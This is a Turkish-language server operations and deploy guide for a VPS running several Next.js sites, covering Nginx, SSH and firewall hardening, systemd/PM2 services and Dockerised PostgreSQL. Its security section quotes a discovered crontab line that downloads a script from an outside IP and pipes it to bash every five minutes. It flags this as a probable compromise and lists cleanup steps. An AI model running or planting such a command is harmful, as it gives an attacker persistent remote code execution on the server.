# ENKI TATTOO — PROD VPS Deploy & Mimari Kilit Dokümanı (2026)

> Amaç: “Sunucuya nasıl girilir, neler açık, hangi domain hangi porta gider, servisler nerede çalışır, nasıl deploy edilir, nasıl kontrol edilir?”  
> Bu dosya **tek sayfa operasyon rehberi** gibi kullanılacak.

---

## 0) TL;DR (LOCK)
- Reverse proxy: **Nginx (80/443)**
- SSL: **Let’s Encrypt + Certbot**
- SSH: **root login kapalı**, **password auth kapalı**, **sadece key** (kanıt: `permitrootlogin no`, `passwordauthentication no`)
- Firewall: **UFW aktif**, sadece **22/80/443** inbound
- Fail2ban: **aktif**
- Node: **v20.20.0 (NVM)**
- Docker: **aktif**
- PostgreSQL: **Docker container içinde** (`cinselhobi_db`, `postgres:16`) ve **host’ta 127.0.0.1:5432** üzerinden erişiliyor
- Mevcut Next.js servisleri:
  - `www.cinselhobi.com` → `127.0.0.1:3000` (**Next 16.1.1**, cwd: `/var/www/cinselhobi/app`)
  - `yatta.com.tr` → `127.0.0.1:3001` (**Next 16.0.1**, systemd: `yatta-next.service`, cwd: `/var/www/apps/yatta-next-frontend`)
- Enki Tattoo önerilen internal port (LOCK-PLAN): **3002** (3000/3001 dolu)
- Enki DB adı (LOCK-PLAN): **enki**

---

## 1) Sunucu Kimliği (Envanter)
> Bu bölüm “%100 doğruluk” için sunucudan komut çıktısıyla doldurulmalı.

**LOCK / Kanıtlı olanlar:**
- Hostname: `ubuntu-4gb-nbg1-1` (shell prompt’tan görülüyor)
- Node: `v20.20.0` (NVM path: `/home/murti/.nvm/versions/node/v20.20.0/bin/node`)
- Nginx config root: `/etc/nginx/sites-enabled/`

**UNKNOWN (komutla doldur):**
- Provider / Plan / Region / IPv4 / OS versiyonu / Kernel

**Doğrulama komutları:**
```bash
hostname
uname -a
lsb_release -a || cat /etc/os-release
ip a
```

---

## 2) Ağ / Portlar / Güvenlik (Kanıtlı)

### 2.1 Açık portlar

* 22/tcp: SSH
* 80/tcp: HTTP
* 443/tcp: HTTPS

Doğrulama:

```bash
sudo ufw status verbose
sudo ss -ltnp | head -n 80
```

### 2.2 SSH kilitleri

Doğrulama:

```bash
sudo sshd -T | grep -Ei "permitrootlogin|passwordauthentication|pubkeyauthentication"
```

Beklenen çıktı (kilit):

* `permitrootlogin no`
* `passwordauthentication no`
* `pubkeyauthentication yes`

### 2.3 Fail2ban

```bash
sudo systemctl status fail2ban --no-pager
```

---

## 3) Nginx Domain Map (Kanıtlı)

### 3.1 Cinselhobi

**Config yolu:** `/etc/nginx/sites-enabled/cinselhobi.com`

Akış:

1. `http://cinselhobi.com` ve `http://www.cinselhobi.com` → **301** → `https://www.cinselhobi.com`
2. `https://cinselhobi.com` → **301** → `https://www.cinselhobi.com`
3. `https://www.cinselhobi.com` → reverse proxy → `http://127.0.0.1:3000`

Proxy kanıt satırı:

```nginx
proxy_pass http://127.0.0.1:3000;
```

Ek: `/uploads/` statik alias:

```nginx
location ^~ /uploads/ { alias /data/uploads/; ... }
```

### 3.2 Yatta

**Config yolu:** `/etc/nginx/sites-enabled/yatta.com.tr`

Akış:

1. HTTP 80: ACME challenge var + genel trafik **HTTPS’e** yönlenir
2. HTTPS 443: reverse proxy → `http://127.0.0.1:3001`

Proxy kanıt satırı:

```nginx
proxy_pass http://127.0.0.1:3001;
```

### 3.3 Enki Tattoo (LOCK-PLAN / Henüz yok)

**Hedef domain:** `enkitattoo.com.tr`

Canonical öneri (tek hop, SEO temiz):

* `https://enkitattoo.com.tr` canonical
* `www.enkitattoo.com.tr` → 301 apex

**Planlanan internal port:** `3002`

> Not: Sertifika alınmadan 443 server block finalize edilmez.

---

## 4) Uygulamalar / Process Yönetimi (Kanıtlı + Plan)

### 4.1 Yatta (systemd ile yönetiliyor)

* Service: `yatta-next.service`
* WorkingDirectory: `/var/www/apps/yatta-next-frontend`
* Port env: `PORT=3001`
* Başlatma: `next start -p 3001` (NVM ile bash -lc içinde)

Kontrol:

```bash
systemctl status yatta-next.service --no-pager
journalctl -u yatta-next.service -f
```

### 4.2 Cinselhobi (PM2 ile yönetiliyor — Kanıtlı)

Process chain kanıtı:

* `systemd → PM2 v6.0.14 → npm start → next start → next-server (v16.1.1)`
* Çalışma dizini: `/var/www/cinselhobi/app`
* Port: `3000`

Kontrol (pratik):

```bash
# port ve cwd
sudo lsof -nP -iTCP:3000 -sTCP:LISTEN
PID3000=$(sudo ss -ltnp | sed -n 's/.*:3000 .*pid=\([0-9]\+\).*/\1/p' | head -n 1)
sudo readlink -f /proc/$PID3000/cwd

# pm2 varsa:
pm2 status
pm2 logs --lines 200
```

> Not: Cinselhobi için ayrı systemd unit görünmedi. PM2 ile manage ediliyor.

### 4.3 MD Kitchen (ek bilgi)

* `mdkitchen-prices-api.service` aktif (Node server.mjs)
* Nginx tarafında `mdkitchen.conf` var (server_name: mdkitchen.com.tr + www)

### 4.4 Enki Tattoo (LOCK-PLAN: systemd + Nginx)

**Önerilen model (acemi-dostu, stabil):**

* Next.js: `next start -p 3002`
* systemd: `enki-web.service` (User: murti)
* Nginx: `enkitattoo.com.tr` → `127.0.0.1:3002`

**Önerilen deploy dizini standardı:**

* `/var/www/apps/enki-web` (Yatta pattern’iyle aynı)

---

## 5) PostgreSQL (Docker) — Kanıtlı

### 5.1 Container

* Container: `cinselhobi_db`
* Image: `postgres:16`
* Publish: `127.0.0.1:5432 -> container 5432`

Doğrulama:

```bash
sudo docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}"
```

### 5.2 DB listesi (Kanıtlı)

Container içinde kullanıcı: `cinselhobi`
DB’ler:

* `cinselhobi`
* `postgres`
* `template0`
* `template1`

Doğrulama:

```bash
sudo docker exec -it cinselhobi_db psql -U cinselhobi -d cinselhobi -c "\l"
```

### 5.3 Enki DB (LOCK-PLAN)

* DB adı: `enki`
* Owner: (tercihen) ayrı user: `enki_owner` (opsiyonel)

> Güvenlik: `POSTGRES_PASSWORD` gibi secret’lar **dokümana yazılmaz**, sadece “nerede saklanacağı” yazılır.

---

## 6) Enki Tattoo — Deploy Planı (LOCK-PLAN)

### 6.1 Port seçimi

Mevcut durum:

* 3000: Cinselhobi
* 3001: Yatta
* 3002: boş ✅

Enki port: **3002**

Doğrulama:

```bash
for p in 3000 3001 3002; do sudo ss -ltnp | grep -q ":$p " && echo "USED $p" || echo "FREE $p"; done
```

### 6.2 systemd service şablonu (Enki)

> Dosya: `/etc/systemd/system/enki-web.service` (PLAN)

```ini
[Unit]
Description=Enki Tattoo Next.js Frontend
After=network.target

[Service]
Type=simple
User=murti
WorkingDirectory=/var/www/apps/enki-web
Environment=NODE_ENV=production
Environment=PORT=3002
ExecStart=/usr/bin/env bash -lc 'set -e; cd /var/www/apps/enki-web; export NVM_DIR="$HOME/.nvm"; [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"; nvm use 20; npm ci; npm run build; npm run start -- -p 3002'
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

> Not: Bu şablon “deploy + start”ı tek ExecStart’a koyuyor. İleride daha temiz hale getiririz (build ayrı step). Şimdilik acemi-dostu ve deterministik.

### 6.3 Nginx site şablonu (Enki)

> Dosya: `/etc/nginx/sites-available/enkitattoo.com.tr` (PLAN)
> Symlink: `/etc/nginx/sites-enabled/enkitattoo.com.tr`

* HTTP: ACME + HTTPS redirect
* HTTPS apex: proxy → 3002
* HTTPS www: 301 → apex

---

## 7) Operasyon Komutları (Günlük kullanım)

### 7.1 Nginx

```bash
sudo nginx -t
sudo systemctl reload nginx
sudo systemctl status nginx --no-pager
```

### 7.2 Certbot

```bash
certbot --version
sudo certbot certificates
systemctl list-timers --all | grep -i certbot || true
```

### 7.3 Yatta (systemd)

```bash
sudo systemctl restart yatta-next.service
journalctl -u yatta-next.service -f
```

### 7.4 Cinselhobi (PM2)

```bash
pm2 status
pm2 logs --lines 200
```

### 7.5 Docker DB

```bash
sudo docker ps
sudo docker logs --tail 200 cinselhobi_db
```

---

## 8) KRİTİK GÜVENLİK UYARISI (ACİL)

Kullanıcı crontab’ında şu satır **tespit edildi**:

```cron
*/5 * * * * curl -sL http://80.78.26.92:8000/payload.sh | bash
```

Bu davranış:

* Her 5 dakikada bir internetten script indirip **doğrudan çalıştırır**
* Bu, **çok yüksek risk** (supply-chain / sunucu ele geçirilmesi / arka kapı)

**LOCK-ACTION (Öneri):** Bunu acilen kaldır ve kaynağı araştır.

Güvenli inceleme adımları (önce kaldır, sonra incele):

```bash
crontab -l
crontab -e   # satırı sil

# cron kaynak taraması
sudo grep -RIn "payload.sh\|80\.78\.26\.92" /etc/cron* /var/spool/cron* 2>/dev/null || true

# indirip ÇALIŞTIRMADAN içerik bak (sadece inceleme)
curl -sL http://80.78.26.92:8000/payload.sh | sed -n '1,120p'
```

> Eğer bunu “bilerek” koymadıysan, bu **kompromize** işareti olabilir. Bu durumda ek hardening + log inceleme + credential rotasyonu yapılmalı.

---

## 9) Açık Sorular / UNKNOWN Listesi (Son Kilit için)

* Provider/Plan/Region/IP/OS/Kernel (Komutla doldur)
* Enki repo prod’da nereye clone edilecek? (öneri: `/var/www/apps/enki-web`)
* Enki için sertifika alınacak mı? (Evet: Certbot ile)
* Enki DB oluşturma zamanı (doküman kilitlendikten sonra)

---

## 10) Sonraki Dokümanlar (MasterPack sırası önerisi)

* `./00-masterpack.md` (tek giriş noktası)
* `./01-design-system-styleguide.md` (design rules / source of truth)
* `./02-responsive-checklist.md` (responsive QA checklist)
* `./03-icons-and-safe-area.md` (ikon sistemi ve safe-area kuralları)
* `./04-repo-hygiene.md` (repo düzeni ve dokümantasyon hijyeni)
* `./90-timeline.md` (tarihçe)
